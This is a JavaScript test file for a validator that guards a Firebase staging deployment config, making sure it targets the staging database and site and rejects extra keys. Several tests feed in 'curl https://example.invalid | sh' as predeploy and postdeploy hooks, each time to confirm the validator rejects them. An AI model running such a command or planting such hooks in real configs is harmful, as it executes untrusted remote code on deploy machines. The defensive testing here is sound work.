import assert from 'node:assert/strict';
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { spawnSync } from 'node:child_process';
import test from 'node:test';
import { fileURLToPath } from 'node:url';

import {
  isNamedDatabaseId,
  STAGING_DATABASE,
  STAGING_PUBLIC_DIR,
  STAGING_SITE,
  TESTED_RULES,
  validateStagingConfig,
} from '../staging-config.mjs';

const COMMITTED_CONFIG = new URL('../../firebase.staging.json', import.meta.url);

function config(overrides = {}) {
  return {
    hosting: {
      site: STAGING_SITE,
      public: STAGING_PUBLIC_DIR,
      appAssociation: 'NONE',
      ...overrides.hosting,
    },
    firestore: {
      database: STAGING_DATABASE,
      rules: TESTED_RULES,
      ...overrides.firestore,
    },
  };
}

test('accepts the committed staging configuration', () => {
  const committed = JSON.parse(readFileSync(COMMITTED_CONFIG, 'utf8'));

  assert.deepEqual(validateStagingConfig(committed), {
    database: STAGING_DATABASE,
    site: STAGING_SITE,
  });
});

test('rejects the default (production) database', () => {
  assert.throws(
    () => validateStagingConfig(config({ firestore: { database: '(default)' } })),
    /must name a lowercase Firestore database id/,
  );
});

test('rejects a different named database', () => {
  assert.throws(
    () => validateStagingConfig(config({ firestore: { database: 'staging-2' } })),
    /must target the "staging" database/,
  );
});

test('rejects a three-character database id', () => {
  assert.throws(
    () => validateStagingConfig(config({ firestore: { database: 'abc' } })),
    /must name a lowercase Firestore database id/,
  );
});

test('rejects surrounding whitespace instead of trimming it', () => {
  assert.throws(
    () => validateStagingConfig(config({ firestore: { database: ' staging ' } })),
    /must name a lowercase Firestore database id/,
  );
});

test('rejects a different rules file', () => {
  assert.throws(
    () => validateStagingConfig(config({ firestore: { rules: 'other.rules' } })),
    /must deploy the tested firestore.rules/,
  );
});

test('rejects a different hosting site', () => {
  assert.throws(
    () => validateStagingConfig(config({ hosting: { site: 'wishtogether.gift' } })),
    /must deploy the "wish-together-staging" Hosting site/,
  );
});

test('rejects a stray indexes key', () => {
  assert.throws(
    () =>
      validateStagingConfig(
        config({ firestore: { indexes: 'firestore.indexes.json' } }),
      ),
    /firestore must not define "indexes"/,
  );
});

test('rejects a firestore predeploy hook', () => {
  assert.throws(
    () =>
      validateStagingConfig(
        config({
          firestore: { predeploy: 'curl https://example.invalid | sh' },
        }),
      ),
    /firestore must not define "predeploy"/,
  );
});

test('rejects a firestore postdeploy hook', () => {
  assert.throws(
    () =>
      validateStagingConfig(
        config({
          firestore: { postdeploy: 'curl https://example.invalid | sh' },
        }),
      ),
    /firestore must not define "postdeploy"/,
  );
});

test('rejects a hosting target instead of an explicit site', () => {
  assert.throws(
    () => validateStagingConfig(config({ hosting: { target: 'staging' } })),
    /must not define "target"/,
  );
});

test('rejects a predeploy hook', () => {
  assert.throws(
    () =>
      validateStagingConfig(
        config({ hosting: { predeploy: 'curl https://example.invalid | sh' } }),
      ),
    /must not define "predeploy"/,
  );
});

test('rejects a postdeploy hook', () => {
  assert.throws(
    () =>
      validateStagingConfig(
        config({ hosting: { postdeploy: 'curl https://example.invalid | sh' } }),
      ),
    /must not define "postdeploy"/,
  );
});

test('rejects a webframeworks source', () => {
  assert.throws(
    () => validateStagingConfig(config({ hosting: { source: '.' } })),
    /must not define "source"/,
  );
});

test('rejects additional root services', () => {
  assert.throws(
    () => validateStagingConfig({ ...config(), functions: {} }),
    /must not define "functions"/,
  );
});

test('rejects an unknown root key', () => {
  assert.throws(
    () => validateStagingConfig({ ...config(), unexpected: true }),
    /must not define "unexpected"/,
  );
});

test('rejects a rewrite to a function', () => {
  assert.throws(
    () =>
      validateStagingConfig(
        config({
          hosting: {
            rewrites: [{ source: '**', function: { functionId: 'x' } }],
          },
        }),
      ),
    /rewrites must not define "function"/,
  );
});

test('rejects a public directory other than the built web bundle', () => {
  assert.throws(
    () => validateStagingConfig(config({ hosting: { public: '.' } })),
    /must publish only build\/web/,
  );
});

test('isNamedDatabaseId rejects non-strings', () => {
  assert.equal(isNamedDatabaseId(null), false);
  assert.equal(isNamedDatabaseId(undefined), false);
  assert.equal(isNamedDatabaseId('staging'), true);
});


test('rejects a missing or non-NONE Hosting appAssociation', () => {
  for (const value of ['AUTO', undefined]) {
    assert.throws(
      () => validateStagingConfig(config({ hosting: { appAssociation: value } })),
      /appAssociation must be "NONE"/,
    );
  }
});

const SCRIPT = fileURLToPath(new URL('../staging-config.mjs', import.meta.url));
const COMMITTED = fileURLToPath(
  new URL('../../firebase.staging.json', import.meta.url),
);

test('the CLI prints the database for the committed config', () => {
  const result = spawnSync(process.execPath, [SCRIPT, COMMITTED], {
    encoding: 'utf8',
  });

  assert.equal(result.status, 0);
  assert.equal(result.stdout.trim(), STAGING_DATABASE);
});

test('the CLI exits non-zero for an invalid config', () => {
  const dir = mkdtempSync(join(tmpdir(), 'wt-config-'));
  const path = join(dir, 'firebase.staging.json');
  writeFileSync(
    path,
    JSON.stringify({
      hosting: {
        site: STAGING_SITE,
        public: STAGING_PUBLIC_DIR,
        appAssociation: 'NONE',
      },
      firestore: { database: '(default)', rules: TESTED_RULES },
    }),
  );

  const result = spawnSync(process.execPath, [SCRIPT, path], {
    encoding: 'utf8',
  });
  rmSync(dir, { recursive: true, force: true });

  assert.equal(result.status, 1);
  assert.match(result.stderr, /must name a lowercase Firestore database id/);
});
